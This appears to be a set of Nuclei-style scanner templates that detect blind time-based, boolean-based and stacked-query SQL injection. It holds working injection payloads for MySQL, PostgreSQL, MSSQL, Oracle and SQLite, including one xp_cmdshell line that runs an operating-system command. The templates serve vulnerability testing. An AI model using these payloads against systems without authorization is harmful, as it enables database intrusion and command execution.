id: sqli-blind-time-based

info:
  name: Blind SQL Injection - Time Based
  author: ancarna
  severity: high
  description: Detects blind SQL injection using time-based techniques
  tags: sqli,blind,time-based,injection,owasp-top10
  classification:
    cwe-id: 89
  reference:
    - https://owasp.org/www-community/attacks/Blind_SQL_Injection
    - https://portswigger.net/web-security/sql-injection/blind

http:
  - method: GET
    path:
      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
    payloads:
      payload:
        # MySQL time-based
        - "1' AND SLEEP(5)--"
        - "1\" AND SLEEP(5)--"
        - "1') AND SLEEP(5)--"
        - "1\") AND SLEEP(5)--"
        - "1 AND SLEEP(5)"
        - "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        - "1' AND BENCHMARK(5000000,SHA1('test'))--"
        # PostgreSQL time-based
        - "1'; SELECT pg_sleep(5)--"
        - "1\"; SELECT pg_sleep(5)--"
        - "1' AND (SELECT pg_sleep(5))::text=''--"
        - "1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"
        # MSSQL time-based
        - "1'; WAITFOR DELAY '0:0:5'--"
        - "1\"; WAITFOR DELAY '0:0:5'--"
        - "1'); WAITFOR DELAY '0:0:5'--"
        - "1' IF 1=1 WAITFOR DELAY '0:0:5'--"
        # Oracle time-based
        - "1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--"
        - "1' AND (SELECT CASE WHEN (1=1) THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END FROM dual)='a'--"
        # SQLite time-based (using randomblob for delay)
        - "1' AND (SELECT hex(randomblob(100000000/2)))--"
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

---
id: sqli-blind-boolean

info:
  name: Blind SQL Injection - Boolean Based
  author: ancarna
  severity: high
  description: Detects blind SQL injection using boolean-based techniques
  tags: sqli,blind,boolean,injection,owasp-top10
  classification:
    cwe-id: 89
  reference:
    - https://owasp.org/www-community/attacks/Blind_SQL_Injection

http:
  - method: GET
    path:
      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
    payloads:
      payload:
        # True conditions
        - "1' AND '1'='1"
        - "1\" AND \"1\"=\"1"
        - "1' AND 1=1--"
        - "1\" AND 1=1--"
        - "1') AND ('1'='1"
        - "1' OR '1'='1"
    matchers:
      - type: dsl
        name: true-condition
        dsl:
          - "status_code == 200"
          - "len(body) > 0"
        condition: and

  - method: GET
    path:
      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
    payloads:
      payload:
        # False conditions - should produce different response
        - "1' AND '1'='2"
        - "1\" AND \"1\"=\"2"
        - "1' AND 1=2--"
        - "1\" AND 1=2--"
    matchers:
      - type: dsl
        name: false-condition
        dsl:
          - "status_code != 200 || len(body) == 0"

---
id: sqli-stacked-queries

info:
  name: SQL Injection - Stacked Queries
  author: ancarna
  severity: critical
  description: Detects SQL injection via stacked queries
  tags: sqli,stacked,injection
  classification:
    cwe-id: 89

http:
  - method: GET
    path:
      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
    payloads:
      payload:
        # MySQL
        - "1'; SELECT SLEEP(5);--"
        - "1\"; SELECT SLEEP(5);--"
        # PostgreSQL
        - "1'; SELECT pg_sleep(5);--"
        # MSSQL
        - "1'; WAITFOR DELAY '0:0:5';--"
        - "1'; EXEC xp_cmdshell('ping -n 5 127.0.0.1');--"
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"
